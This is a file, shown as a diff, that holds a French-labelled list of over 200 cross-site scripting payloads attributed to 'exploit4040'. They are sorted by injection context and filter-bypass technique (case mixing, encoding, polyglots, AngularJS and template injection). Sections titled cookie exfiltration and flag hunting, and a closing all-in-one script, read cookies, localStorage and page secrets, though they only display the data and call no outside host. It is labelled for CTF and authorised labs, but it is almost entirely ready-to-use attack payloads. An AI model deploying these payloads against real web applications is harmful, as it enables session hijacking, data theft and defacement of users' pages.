@@ -1,0 +1,334 @@
+═══════════════════════════════════════════════════════════════════════════
+  XSS PAYLOAD LIST — exploit4040 (ML)
+  200+ payloads organisés par catégorie et contexte
+  ⚠️ Usage exclusif CTF / Labs autorisés
+═══════════════════════════════════════════════════════════════════════════
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [01] BASIQUES — Test initial
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.location)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>console.log('XSS')</script>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [02] IMG — onerror
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<img src='x' onerror='alert(1)'>
+<img src="x" onerror="alert(1)">
+<IMG SRC=x OnErRoR=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=confirm(1)>
+<img src=1 href=1 onerror=alert(1)>
+<img src=x onerror="alert('XSS_CTF')">
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=document.write(document.cookie)>
+<img src=x onerror="document.title=document.cookie">
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [03] SVG
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert('XSS')>
+<svg onload=alert(document.cookie)>
+<svg onload=prompt(1)>
+<svg onload="javascript:alert(1)">
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x>
+<svg onload=alert`1`>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [04] HTML EVENTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<body onload=alert(1)>
+<body onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<div onmouseover=alert(1)>hover</div>
+<button onclick=alert(1)>click</button>
+<a onmouseover=alert(1)>hover</a>
+<p onmouseenter=alert(1)>test</p>
+<table background=javascript:alert(1)>
+<iframe onload=alert(1)>
+<video autoplay onplay=alert(1)><source src=x></video>
+<audio autoplay onplay=alert(1)><source src=x></audio>
+<input type=image src=x onerror=alert(1)>
+<form id=x><button form=x formaction=javascript:alert(1)>click
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [05] CASSER UN ATTRIBUT HTML
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
+"><body onload=alert(1)>
+"><details open ontoggle=alert(1)>
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onclick="alert(1)
+" onerror="alert(1)
+" onload="alert(1)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [06] CASSER DU JAVASCRIPT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+";alert(1)//
+';alert(1)//
+`;alert(1)//
+`};alert(1)//
+</script><script>alert(1)</script>
+"+alert(1)+"
+'+alert(1)+'
+\";alert(1)//
+\\';alert(1)//
+${alert(1)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [07] BYPASS — Case mixing
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<Script>alert(1)</Script>
+<sCrIpT>alert(1)</sCrIpT>
+<IMG SRC=x OnErRoR=alert(1)>
+<SVG ONLOAD=alert(1)>
+<Svg Onload=alert(1)>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [08] BYPASS — Encodage HTML
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<img src=x onerror=&#97;lert(1)>
+<img src=x onerror=&#x61;lert(1)>
+<svg onload=&#97;lert(1)>
+&#60;script&#62;alert(1)&#60;/script&#62;
+&lt;script&gt;alert(1)&lt;/script&gt;
+<img src=x onerror=\u0061lert(1)>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [09] BYPASS — Espaces remplacés
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<svg/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+<svg	onload=alert(1)>
+<svg
+onload=alert(1)>
+<img
+src=x
+onerror=alert(1)>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [10] BYPASS — URL encodage
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg+src%3Dx+onerror%3Dalert(1)%3E
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+%27%3E%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg%20onload%3Dalert(1)%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [11] SANS PARENTHÈSES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<img src=x onerror=alert`XSS`>
+<svg onload=alert`1`>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>onerror=alert;throw'XSS'</script>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [12] HREF / JAVASCRIPT URI
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<a href=javascript:alert(1)>click</a>
+<a href='javascript:alert(1)'>click</a>
+<a href="javascript:alert(1)">click</a>
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:prompt(1)
+<a href="javascript:void(0)" onclick="alert(1)">x</a>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [13] DATA URI
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<iframe src="data:text/html,<script>alert(1)</script>">
+<object data='data:text/html,<script>alert(1)</script>'>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [14] IFRAME / OBJECT / EMBED
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert(document.cookie)">
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [15] FRAMEWORKS — AngularJS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+{{7*7}}
+{{alert(1)}}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [16] TEMPLATES — SST/EJS/Jinja
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+${alert(1)}
+#{alert(1)}
+<%= alert(1) %>
+{{ alert(1) }}
+{alert(1)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [17] BYPASS TRICKS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<script>alert(1)//<</script>
+<script >alert(1)</script >
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+--><script>alert(1)</script>
+]]><script>alert(1)</script>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [18] DOM — Hash / Fragment
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#<img src=x onerror=alert(1)>
+#<script>alert(1)</script>
+#<svg onload=alert(1)>
+?q=<script>alert(1)</script>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [19] COOKIE EXFIL (CTF)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<script>alert(document.cookie)</script>
+<img src=x onerror="alert(document.cookie)">
+<svg onload="alert(document.cookie)">
+<script>document.write(document.cookie)</script>
+<script>document.title=document.cookie</script>
+<script>var x=document.cookie;document.write('<h1>'+x+'</h1>')</script>
+<img src=x onerror="document.body.innerHTML='<h1>'+document.cookie+'</h1>'">
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [20] FLAG HUNTERS (CTF)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<script>alert(document.getElementById('flag').innerText)</script>
+<script>alert(document.querySelector('.flag').textContent)</script>
+<script>alert(document.title)</script>
+<script>alert(JSON.stringify(localStorage))</script>
+<script>alert(JSON.stringify(sessionStorage))</script>
+<script>alert(document.documentElement.innerHTML.match(/FLAG{.*?}/g))</script>
+<script>alert(document.documentElement.innerHTML.match(/CTF{.*?}/g))</script>
+<svg onload="alert(document.documentElement.innerHTML.match(/flag{.*?}/gi))">
+<script>Object.keys(window).filter(k=>k.includes('flag')).forEach(k=>alert(k+':'+window[k]))</script>
+<script>for(var i in window){if(i.toLowerCase().includes('flag'))alert(i+': '+window[i])}</script>
+<script>
+Object.keys(window)
+  .filter(k=>['flag','secret','token','key','ctf'].some(w=>k.toLowerCase().includes(w)))
+  .forEach(k=>alert(k+'='+window[k]))
+</script>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [21] DOM MANIPULATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<script>document.body.style.background='red'</script>
+<script>document.body.innerHTML='<h1 style="color:red;text-align:center;margin-top:20%">XSS by exploit4040</h1>'</script>
+<img src=x onerror="document.body.innerHTML='<h1 style=color:red>PWNED</h1>'">
+<svg onload="document.title='XSS by ML'">
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [22] POLYGLOTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'"><img src=x onerror=alert(1)><"'
+<!--<img src="--><img src=x onerror=alert(1)//>
+<base href="javascript://"><a href="//#-alert(1)">click
+'"<svg/onload=alert(1)>"'
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [23] META / CSS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<meta http-equiv=refresh content='0;javascript:alert(1)'>
+<style>*{background:url('javascript:alert(1)')}</style>
+<div style="background:url('javascript:alert(1)')">
+<link rel=stylesheet href=javascript:alert(1)>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [24] MATH / SVG AVANCÉ
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<math><mi href=javascript:alert(1)>click</mi></math>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [25] EXFIL DOM COMPLET
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<script>document.write(document.documentElement.outerHTML)</script>
+<script>alert(btoa(document.documentElement.innerHTML).substr(0,200))</script>
+<img src=x onerror="alert(btoa(document.documentElement.innerHTML).substr(0,100))">
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [26] ÉVÉNEMENTS RARES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<isindex action=javascript:alert(1) type=image>
+<img dynsrc=javascript:alert(1)>
+<img lowsrc=javascript:alert(1)>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ [27] SANS BALISES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+onmouseover=alert(1)
+onerror=alert(1)
+onload=alert(1)
+onfocus=alert(1)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ PAYLOAD ULTIME CTF — Tout-en-un
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<script>
+(function(){
+  var results = [];
+  // Cookie
+  if(document.cookie) results.push('COOKIE: ' + document.cookie);
+  // Title
+  if(document.title) results.push('TITLE: ' + document.title);
+  // Flag dans DOM
+  var f = document.documentElement.innerHTML.match(/(FLAG|CTF|flag)\{[^}]+\}/gi);
+  if(f) results.push('FLAG DOM: ' + f.join(', '));
+  // Variables window
+  Object.keys(window).filter(k=>k.toLowerCase().includes('flag'))
+    .forEach(k=>results.push('WIN: '+k+'='+window[k]));
+  // localStorage
+  if(localStorage.length) results.push('LS: '+JSON.stringify(localStorage));
+  // Affichage
+  if(results.length) alert(results.join('\n'));
+  else alert('Rien trouvé. DOM:\n'+document.documentElement.innerHTML.substr(0,500));
+})();
+</script>
+
+═══════════════════════════════════════════════════════════════════════════
+  Auteur : ML | GitHub : exploit4040
+  ⚠️ Pour CTF et labs autorisés uniquement
+═══════════════════════════════════════════════════════════════════════════
